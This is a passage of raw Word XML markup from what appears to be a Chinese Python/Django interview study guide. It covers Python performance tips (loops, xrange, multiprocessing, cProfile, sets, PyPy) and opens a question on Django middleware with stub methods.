        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="518" w:name="3447-1535455105183"/>
      <w:bookmarkEnd w:id="518"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>算法的时间复杂度对程序的执行效率影响最大，在 Python 中可以通过选择合适的数据结构来优化时间复杂度，如 list 和 set 查找某一个元素的时间复杂度分别是  O(n)和  O(1)。不同的场景有不同的优化方式，总得来说，一般有分治，分支界限，贪心，动态规划等思想。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CFE5B3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="519" w:name="8730-1535455105183"/>
      <w:bookmarkEnd w:id="519"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）循环优化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AABFEE9" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="520" w:name="3141-1535455105183"/>
      <w:bookmarkEnd w:id="520"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>每种编程语言都会强调需要优化循环。当使用 Python 的时候，你可以依靠大量的技巧使得循环运行得更快。然而，开发者经常漏掉的一个方法是：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135F064A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="521" w:name="3341-1535455105183"/>
      <w:bookmarkEnd w:id="521"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>避免在一个循环中使用点操作。每一次你调用方法 str.upper，Python 都会求该方法的值。然而， 如果你用一个变量代替求得的值，值就变成了已知的，Python 就可以更快地执行任务。优化循环的关键，是要减少  Python  在循环内部执行的工作量，因为 Python  原生的解释器在那种情况下，真的会减缓执行的速度。（注意：优化循环的方法有很多，这只是其中的一个。例如，许多程序员都会说，列表推导是在循环中提高执行速度的最好方式。这里的关键是，优化循环是程序取得更高的执行速度的更好方式之一。）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F810FF6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="522" w:name="3311-1535455105183"/>
      <w:bookmarkEnd w:id="522"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）函数选择</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554E2A5B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="523" w:name="9567-1535455105183"/>
      <w:bookmarkEnd w:id="523"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在循环的时候使用 xrange 而不是 range；使用 xrange 可以节省大量的系统内存，因为  xrange() 在序列中每次调用只产生一个整数元素。而 range()將直接返回完整的元素列表，用于循环时会有不必要的开销。在 python3 中 xrange 不再存在，里面 range 提供一个可以遍历任意长度的范围的iterator。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BBC4AB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="524" w:name="4065-1535455105183"/>
      <w:bookmarkEnd w:id="524"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（4）并行编程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6874A544" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="525" w:name="4986-1535455105183"/>
      <w:bookmarkEnd w:id="525"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>因为 GIL 的存在，Python 很难充分利用多核 CPU 的优势。但是，可以通过内置的模块multiprocessing 实现下面几种并行模式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF5170A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="526" w:name="9097-1535455105183"/>
      <w:bookmarkEnd w:id="526"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>多进程：对于 CPU 密集型的程序，可以使用 multiprocessing 的 Process，Pool 等封装好的类， 通过多进程的方式实现并行计算。但是因为进程中的通信成本比较大，对于进程之间需要大量数据交互的程序效率未必有大的提高。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E81C5B5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="527" w:name="9430-1535455105183"/>
      <w:bookmarkEnd w:id="527"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>多线程：对于 IO 密集型的程序，multiprocessing.dummy 模块使用 multiprocessing  的接口封装 threading，使得多线程编程也变得非常轻松(比如可以使用 Pool 的 map 接口，简洁高效)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738A79E2" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="528" w:name="9765-1535455105183"/>
      <w:bookmarkEnd w:id="528"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>分布式：multiprocessing 中的 Managers 类提供了可以在不同进程之共享数据的方式，可以在此基础上开发出分布式的程序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2272B7BB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="529" w:name="8299-1535455105183"/>
      <w:bookmarkEnd w:id="529"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>不同的业务场景可以选择其中的一种或几种的组合实现程序性能的优化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FF58AD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="530" w:name="7778-1535455105183"/>
      <w:bookmarkEnd w:id="530"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（5）使用性能分析工具</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF9B339" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="531" w:name="4484-1535455105183"/>
      <w:bookmarkEnd w:id="531"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>除了上面在 ipython 使用到的 timeit 模块，还有 cProfile。cProfile 的使用方式也非常简单： python-mcProfilefilename.py，filename.py 是要运行程序的文件名，可以在标准输出中看到每一个函数被调用的次数和运行的时间，从而找到程序的性能瓶颈，然后可以有针对性地优化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395D6B66" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="532" w:name="3000-1535455105183"/>
      <w:bookmarkEnd w:id="532"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（6）set 的用法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEDEBCA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="533" w:name="4245-1535455105183"/>
      <w:bookmarkEnd w:id="533"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>set 的 union，intersection，difference 操作要比  list  的迭代要快。因此如果涉及到求  list  交集，并集或者差的问题可以转换为 set 来操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757B8603" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="534" w:name="9653-1535455105183"/>
      <w:bookmarkEnd w:id="534"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（7）PyPy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED114EE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="535" w:name="7460-1535455105183"/>
      <w:bookmarkEnd w:id="535"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>PyPy 是用 RPython(CPython  的子集)实现的 Python，根据官网的基准测试数据，它比  CPython 实现的 Python 要快  6  倍以上。快的原因是使用了 Just-in-Time(JIT)编译器，即动态编译器，与静态编译器(如 gcc，javac 等)不同，它是利用程序运行的过程的数据进行优化。由于历史原因，目前  pypy 中还保留着 GIL，不过正在进行的 STM 项目试图将 PyPy 变成没有 GIL 的 Python。如果 python 程序中含有  C  扩展(非  cffi  的方式)，JIT  的优化效果会大打折扣，甚至比  CPython 慢（比  Numpy）。所以在 PyPy 中最好用纯 Python 或使用 cffi 扩展。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561CC168" w14:textId="404A8048"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36" w:name="8641-1535453911306"/>
      <w:bookmarkStart w:id="537" w:name="1336-1535455189634"/>
      <w:bookmarkEnd w:id="536"/>
      <w:bookmarkEnd w:id="537"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>020</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中间件是如何使用的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28348F8B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="538" w:name="6180-1535453911337"/>
      <w:bookmarkEnd w:id="538"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>中间件不用继承自任何类（可以继承 object），下面一个中间件大概的样子：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03739C65" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="539" w:name="8160-1535453911363"/>
      <w:bookmarkEnd w:id="539"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class CommonMiddleware(object):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05437A74" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="540" w:name="4892-1535453911386"/>
      <w:bookmarkEnd w:id="540"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_request(self， request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BD6A9E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="541" w:name="7860-1535455297882"/>
      <w:bookmarkEnd w:id="541"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AFE4E5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="542" w:name="8340-1535455309112"/>
      <w:bookmarkEnd w:id="542"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_response(self， request， response):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27ED198F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="543" w:name="1268-1535455311678"/>
      <w:bookmarkEnd w:id="543"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>return response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFA39CC" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="544" w:name="4034-1535455356870"/>
      <w:bookmarkEnd w:id="544"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>还有 process_view， process_exception 和 process_template_response 函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13881F74" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="545" w:name="9044-1535455356870"/>
      <w:bookmarkEnd w:id="545"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1）初始化：无需任何参数，服务器响应第一个请求的时候调用一次，用于确定是否启用当前中间件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682B5E89" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="546" w:name="4289-1535455376365"/>
      <w:bookmarkEnd w:id="546"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def init (self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D68CDA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="547" w:name="5556-1535455377779"/>
      <w:bookmarkEnd w:id="547"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE6744A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="548" w:name="8618-1535455395844"/>
      <w:bookmarkEnd w:id="548"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2）处理请求前：在每个请求上，request 对象产生之后，url 匹配之前调用，返回 None 或HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330826B5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="549" w:name="2182-1535455408348"/>
      <w:bookmarkEnd w:id="549"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_request(self， request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC1AFD7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="550" w:name="3822-1535455414985"/>
      <w:bookmarkEnd w:id="550"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5383ACE3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="551" w:name="2970-1535455434106"/>
      <w:bookmarkEnd w:id="551"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3）处理视图前：在每个请求上，url 匹配之后，视图函数调用之前调用，返回 None 或</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8C5BE0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="552" w:name="3974-1535455438785"/>
      <w:bookmarkEnd w:id="552"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CAD914C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="553" w:name="6573-1535455457154"/>
      <w:bookmarkEnd w:id="553"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_view(self， request， view_func， *view_args，**view_kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79ABB9E4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="554" w:name="9031-1535455457813"/>
      <w:bookmarkEnd w:id="554"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C076340" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="555" w:name="7758-1535455469288"/>
      <w:bookmarkEnd w:id="555"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
